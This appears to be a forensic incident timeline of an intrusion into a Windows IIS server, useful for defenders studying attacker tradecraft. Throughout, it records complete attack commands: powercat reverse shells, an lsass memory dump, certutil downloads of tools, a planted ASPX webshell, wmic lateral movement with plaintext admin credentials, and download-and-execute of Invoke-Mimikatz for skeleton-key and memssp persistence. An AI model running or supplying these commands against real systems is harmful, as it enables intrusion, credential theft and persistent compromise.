# windows ISS server
* 2020/8/4 AM 08:42:33 CVE-2020-0688 (awaiting to determinate)
```
c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm127dc09c-653d-45f2-8d87-b91abf5fdbce -h "C:\inetpub\temp\apppools\ASP.NET v4.0\ASP.NET v4.0.config" -w "" -m 0 -t 20
```
* 2020/8/4 AM 08:48:26 create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to ip source ```10.20.3.88``` with role ```SYSTEM```

* 2020/8/4 AM 08:51:25 execute ```Sqldumper.exe  468 0 0x01100``` dumps the process with pid ```468```(probably ``` lsass.exe```)

* 2020/8/4 AM 09:12:51 execute ```certutil.exe  -urlcache -split -f http://192.168.1.2/nt.exe nt.exe``` to download ```nt.exe``` from ubuntu server

* 2020/8/4 AM 09:13 execute ```nt.exe``` with various parameter
    * -help
    * /h

* 2020/8/4 AM 09:16:02 execute ```certutil.exe  -urlcache -split -f http://192.168.1.2/bt.exe bt.exe``` to download ```bt.exe``` from ubuntu server

* 2020/8/4 AM 09:16:29 execute ```bt.exe 192.168.1.0/24``` in ```C:\Users\Public\Music\```

* 2020/8/5 AM 07:34:16 create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to ip source ```10.20.3.88```

* 2020/8/5 AM 08:58:20 create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to ip source ```10.20.2.165```

* 2020/8/5 AM 09:07:15 download string from ```http://10.20.2.206/test.txt``` as ```test.aspx```


* 2020/8/5 PM 10:07:07 create [aspx webshell](https://raw.githubusercontent.com/tennc/webshell/master/aspx/AspxSpy2014Final.aspx) at ```inetpub/wwwroot/UmbracoCms/Umbraco```

* 2020/8/5 PM 10:25:34 RPC ```192.168.1.4``` via ```"c:\windows\system32\cmd.exe" /c wmic /node:192.168.1.4 /user:TEAMT5\Administrator /password:admin12345!!! process call create "ipconfig.exe"```


* 2020/8/5 PM 10:26:13 invoke Mimikatz via ```c:\windows\system32\cmd.exe" /c wmic process call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'\"``` to create password skeleton key

* 2020/8/5 PM 10:26:25 invoke Mimikatz via ```wmic  process call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'\""``` to modify ```lsass.exe```

* 2020/8/5 PM 10:27:32 ```"c:\windows\system32\cmd.exe" /c net use z: \\WIN-LN8SES7K1Q5\C$ /user:TEAMT5\Administrator mimikatz```